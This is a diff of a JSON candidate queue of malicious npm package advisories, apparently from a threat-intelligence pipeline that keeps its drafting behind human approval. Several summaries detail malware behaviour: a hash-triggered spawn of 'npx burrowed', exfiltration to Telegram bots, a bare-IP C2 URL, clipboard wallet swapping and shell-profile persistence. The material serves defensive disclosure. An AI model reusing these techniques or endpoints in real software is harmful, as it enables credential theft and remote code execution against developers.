-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:46:21.665Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-4c0066235cddce8e",
@@ -1917,7 +2103,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-110ad0aa9f697bf4",
@@ -1974,7 +2160,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-8fef65f5460e3454",
@@ -2031,7 +2217,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-6b47687dbadb6a83",
@@ -2088,7 +2274,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-92458d52e28083dd",
@@ -2145,7 +2331,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-12f4e0e3b229009f",
@@ -2202,7 +2388,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-65f4696823972d88",
@@ -2259,7 +2445,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-a900f05028bf0714",
@@ -2316,26 +2502,26 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-25T06:09:45.573Z"
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
-      "candidateId": "SC-CAND-0d6e1264ec39d994",
-      "canonicalSubjectId": "GHSA-623X-X2WH-Q9XQ",
+      "candidateId": "SC-CAND-26080c9dd8054b54",
+      "canonicalSubjectId": "MAL-2026-6459",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malware in pathfix",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malicious code in easy-string-kit (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: ossf-package-analysis (afb272eb6208527c57abc9ef604a3776dfdca057e5c9b16e524aa4703df623b4) The OpenSSF Package Analysis project identified 'easy-string-kit' @ 1.0.1 (npm) as malicious. It is considered malicious because: - The package communicates with a domain associated with malicious activity. - The package executes one or more commands associated with malicious behavior.",
       "sources": [
-        "github-advisory"
+        "osv"
       ],
       "sourceRefs": [
-        "https://github.com/advisories/GHSA-623x-x2wh-q9xq"
+        "https://osv.dev/vulnerability/MAL-2026-6459"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-623x-x2wh-q9xq"
+        "osv:MAL-2026-6459"
       ],
-      "firstSeenAt": "2026-06-25T06:02:17.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:02:17.000Z",
+      "firstSeenAt": "2026-06-25T08:39:07.000Z",
+      "lastMaterialActivityAt": "2026-06-25T09:31:21.973Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -2354,7 +2540,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:02:17.000Z",
+        "activeStatusExpiresAt": "2026-07-25T09:31:21.973Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -2372,23 +2558,23 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
-      "candidateId": "SC-CAND-f80ad26f3ca62b54",
-      "canonicalSubjectId": "GHSA-G6FX-78Q6-3HQV",
+      "candidateId": "SC-CAND-e7c96ec4a9309fbf",
+      "canonicalSubjectId": "MAL-2026-6447",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malware in easy-time-format",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malicious code in based-32 (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (52ca241d887ed83628c8c4a4432ca0f832d092e6058c7ab4250cc5b169ba7fb9) based-32 advertises itself as a zero-dependency RFC4648 Base32 encoding library, but `dist/index.js` ships a hidden trigger inside the exported `handleSecureEncode()` function (also reachable via the `based32 -s <data>` CLI). The function passes the caller's input through `checkSecurityProtocol()`, which SHA-256-hashes the input and compares it against the hardcoded constant `SECURITY_HASH = \"71c37c896ba7d9164cc91cb4507df9d3f42bd2ce728a93673b3dabfda45c7ed2\"`. On match, it executes `spawn('npx', ['burrowed','on','--root'], { detached: true, stdio: 'ignore', windowsHide: true, shell: true })` and calls `unref()` on the child, fetching and running the remote `burrowed` npm package as a detached, stdio-suppressed, window-hidden daemon. The surrounding try/catch swallows all errors so failures are silent. The naming (`SECURITY_HASH`, `checkSecurityProtocol`, `handleSecureEncode`) is a cover story — none of this behavior is documented in the README, and there is no Base32-related reason for the package to spawn npx, fetch a remote package, or run a daemon. Any environment where an attacker can deliver the magic input string into `handleSecureEncode` (or invoke `based32 -s`) gains arbitrary remote-code execution as a hidden background process under the installer's user.",
       "sources": [
-        "github-advisory"
+        "osv"
       ],
       "sourceRefs": [
-        "https://github.com/advisories/GHSA-g6fx-78q6-3hqv"
+        "https://osv.dev/vulnerability/MAL-2026-6447"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-g6fx-78q6-3hqv"
+        "osv:MAL-2026-6447"
       ],
-      "firstSeenAt": "2026-06-25T05:49:06.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:49:07.000Z",
+      "firstSeenAt": "2026-06-25T06:53:14.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.993Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -2407,7 +2593,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:49:07.000Z",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.993Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -2425,23 +2611,23 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
-      "candidateId": "SC-CAND-ec560f2191a1097a",
-      "canonicalSubjectId": "GHSA-WFFF-G64J-QX73",
+      "candidateId": "SC-CAND-cb53d8dd01b9d498",
+      "canonicalSubjectId": "MAL-2026-6446",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malware in easy-time666",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malicious code in base62-86x (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (811002816e7f72588c7c6540b088af5c44b8280574e43dbaeef4701fe377fe9f) Package impersonates the legitimate base-x/base62 library by Daniel Cousens (name `base62-86x`, homepage pointing at cryptocoinjs/base-x, identical source layout). The exported `decode(string)` function in both the CJS build (src/cjs/index.cjs) and the ESM build (src/esm/index.js) has been patched to silently POST every caller-supplied input to a hardcoded Telegram Bot API endpoint. The CJS variant hides the destination behind obfuscator.io string-array rotation that resolves to https://api.telegram.org/bot7837266935:<redacted>/sendMessage with chat_id 7974622428; the ESM variant wraps the same exfiltration in a custom bytecode VM whose base64 constant pool decodes to https://api.telegram.org/bot8880020840:<redacted>/sendMessage with chat_id 7959381237. Because consumers of a base-encoding library typically pass cryptocurrency addresses, private keys, identifiers, and other base-encoded secrets to decode(), every such call leaks the plaintext input to the attacker. Two distinct bot tokens indicate staged campaign or failover infrastructure. Heavy obfuscation of both bodies confirms intent to conceal the relay; there is no opt-in or documented behavior covering this network egress.",
       "sources": [
-        "github-advisory"
+        "osv"
       ],
       "sourceRefs": [
-        "https://github.com/advisories/GHSA-wfff-g64j-qx73"
+        "https://osv.dev/vulnerability/MAL-2026-6446"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-wfff-g64j-qx73"
+        "osv:MAL-2026-6446"
       ],
-      "firstSeenAt": "2026-06-25T05:49:06.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:49:07.000Z",
+      "firstSeenAt": "2026-06-25T06:42:32.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.844Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -2460,7 +2646,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:49:07.000Z",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.844Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -2478,23 +2664,23 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
-      "candidateId": "SC-CAND-f7bfbb02131577dc",
-      "canonicalSubjectId": "GHSA-892P-5G9M-P64X",
+      "candidateId": "SC-CAND-eb2a009068805979",
+      "canonicalSubjectId": "MAL-2026-6445",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malware in ccl-component-resources",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malicious code in base58-core (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (c10874ae13f1937b6974bcaaec72996e54f85fc3de6bf5e53d732f6e1f37c8a3) The package presents itself as a Base58 encoder/decoder but on require() arms a malicious payload that is time-gated to activate 72 hours after first import (ACTIVATION_DELAY = 72*60*60*1000 in dist/index.cjs:94-95) to evade CI and sandbox testing. Once active, it: (1) starts a 2.5s clipboard polling loop (dist/index.cjs:101-106) that detects BTC, ETH, and SOL addresses and silently rewrites the clipboard to hardcoded attacker wallets (bc1qjft9..., 0xd63eD4..., A7ajd7W5...), redirecting any crypto send the developer copies; (2) captures clipboard contents matching WIF private keys, BIP-39 seed phrases, and 0x-prefixed 64-char hex private keys, plus host metadata (hostname, platform, cwd), and POSTs them in plaintext to a hardcoded bare-IP C2 at http://2.27.62.51:8080/api/health (with:8081 fallback) via dist/index.cjs:96-97; (3) establishes persistence by appending a node -e loader to ~/.bashrc, ~/.zshrc, and ~/.profile and dropping base58-runtime.js into the Windows Start Menu Startup folder (dist/index.cjs:191-204), so the payload re-activates on every shell or login even after the package is removed; (4) uses execSync('powershell...') in dist/index.cjs:153 for Windows clipboard access. The package name impersonates the well-known base58/bs58 family, and the persistence loader references a sibling package '@base58/core' indicating coordinated namespace abuse. Crypto developers are the precise targeted victim profile.",
       "sources": [
-        "github-advisory"
+        "osv"
       ],
       "sourceRefs": [
-        "https://github.com/advisories/GHSA-892p-5g9m-p64x"
+        "https://osv.dev/vulnerability/MAL-2026-6445"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-892p-5g9m-p64x"
+        "osv:MAL-2026-6445"
       ],
-      "firstSeenAt": "2026-06-25T05:46:36.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:46:36.000Z",
+      "firstSeenAt": "2026-06-25T06:43:58.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.760Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -2513,7 +2699,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:46:36.000Z",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.760Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -2531,23 +2717,23 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
-      "candidateId": "SC-CAND-ced068797c868ed3",
-      "canonicalSubjectId": "GHSA-HW6H-JFR8-Q9V4",
+      "candidateId": "SC-CAND-e9b371dd4742054e",
+      "canonicalSubjectId": "MAL-2026-6444",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malware in event-metrics-q3x7",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malicious code in agentsync-tool (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (430fd9891020d33aa720cede12887f97615ac764bd8af19dc27f18bba4729c38) The package advertises itself as a zero-dependency pure-JS markdown sync tool (~150 lines) but ships an undocumented 2.9MB Windows PE binary at bin/native/parser.node (sha256 b1aace6c70312a39ca39e6bba1d9abc6aaf9b23171089b1a548adc89f67f83c3) with no source, no binding.gyp, and no mention in README or CHANGELOG. src/index.js lines 30-34 attempt to load this binary via process.dlopen(module, p) at module load time under the comment 'Load native parser for performance'. The native-binary purpose is contradicted by both the package's advertised functionality (trivial markdown sync that does not need a native parser) and the README's explicit claim of 'zero dependencies, nothing to audit'. Loading dlopen of an opaque native binary executes arbitrary x64 code inside the Node process with full host privileges, and the bytes are inspectable only as a compiled artifact. Additionally, the published name 'agentsync-tool' mismatches the README's install instructions and badges, which advertise a separately-published package 'syncagents'; package.json's repository URL points at a non-git npm package page ('git+https://www.npmjs.com/package/syncagents.git'), and the author is a generic 'agentsync contributors'. The name confusion is consistent with riding the SEO of a legitimate sibling package to deliver the opaque binary to installers who follow README instructions.",
       "sources": [
-        "github-advisory"
+        "osv"
       ],
       "sourceRefs": [
-        "https://github.com/advisories/GHSA-hw6h-jfr8-q9v4"
+        "https://osv.dev/vulnerability/MAL-2026-6444"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-hw6h-jfr8-q9v4"
+        "osv:MAL-2026-6444"
       ],
-      "firstSeenAt": "2026-06-25T05:38:37.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:38:37.000Z",
+      "firstSeenAt": "2026-06-25T06:39:19.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.636Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -2566,7 +2752,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:38:37.000Z",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.636Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -2584,23 +2770,23 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
-      "candidateId": "SC-CAND-b44df1b3eec35706",
-      "canonicalSubjectId": "GHSA-CHQJ-PHP6-8X6M",
+      "candidateId": "SC-CAND-57768a5bbe7c83c8",
+      "canonicalSubjectId": "MAL-2026-6457",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malware in build-tracker-n5p1",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malicious code in subsearch (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (04245cd013e6aa9edb766cf14249c9dd6abd19d6beb9671c22a1a8bbbff3d511) The package's main entry `index.js` is the only file of substance and is wrapped in obfuscator.io string-array + RC4 obfuscation that hides every literal (module names, URL octets, exec arguments). On require(), the deobfuscated code assembles a bare-IP HTTP URL by concatenating four octets via `.concat('.')`, performs an HTTP GET, writes the response body into `os.tmpdir()` via `fs.writeFileSync(path.join(os.tmpdir(), <name>), I.data, {flag:'w+'})`, and immediately executes the dropped file with `child_process.exec(..., {windowsHide:true, cwd: os.tmpdir()})`. `process.on('uncaughtException',...)` is registered to suppress errors. `package.json` has empty description, empty author, no repository, no homepage — the package advertises no functionality; its only effect on import is the dropper. The bare-IP destination has no TLS, no pinning, and no signature verification, so the attacker can swap the executed payload at any time.",
       "sources": [
-        "github-advisory"
+        "osv"
       ],
       "sourceRefs": [
-        "https://github.com/advisories/GHSA-chqj-php6-8x6m"
+        "https://osv.dev/vulnerability/MAL-2026-6457"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-chqj-php6-8x6m"
+        "osv:MAL-2026-6457"
       ],
-      "firstSeenAt": "2026-06-25T05:38:37.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:38:37.000Z",
+      "firstSeenAt": "2026-06-25T07:21:52.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.038Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -2619,166 +2805,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:38:37.000Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 59,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-8b3fca3321809713",
-      "canonicalSubjectId": "GHSA-QP73-R9HH-6VQ9",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malware in ts-grok",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "sources": [
-        "github-advisory"
-      ],
-      "sourceRefs": [
-        "https://github.com/advisories/GHSA-qp73-r9hh-6vq9"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-qp73-r9hh-6vq9"
-      ],
-      "firstSeenAt": "2026-06-25T04:29:43.000Z",
-      "lastMaterialActivityAt": "2026-06-25T04:29:43.000Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p1",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T04:29:43.000Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 59,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-00587a49e7253a80",
-      "canonicalSubjectId": "GHSA-PG29-X97H-GFR6",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malware in block-slot",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "sources": [
-        "github-advisory"
-      ],
-      "sourceRefs": [
-        "https://github.com/advisories/GHSA-pg29-x97h-gfr6"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-pg29-x97h-gfr6"
-      ],
-      "firstSeenAt": "2026-06-25T04:29:43.000Z",
-      "lastMaterialActivityAt": "2026-06-25T04:29:43.000Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p1",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T04:29:43.000Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 59,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-ec6b006f64529266",
-      "canonicalSubjectId": "GHSA-Q764-9H8C-8JFR",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malware in loadninja-shared",
-      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "sources": [
-        "github-advisory"
-      ],
-      "sourceRefs": [
-        "https://github.com/advisories/GHSA-q764-9h8c-8jfr"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-q764-9h8c-8jfr"
-      ],
-      "firstSeenAt": "2026-06-25T03:41:41.000Z",
-      "lastMaterialActivityAt": "2026-06-25T03:41:41.000Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p1",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T03:41:41.000Z",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.038Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
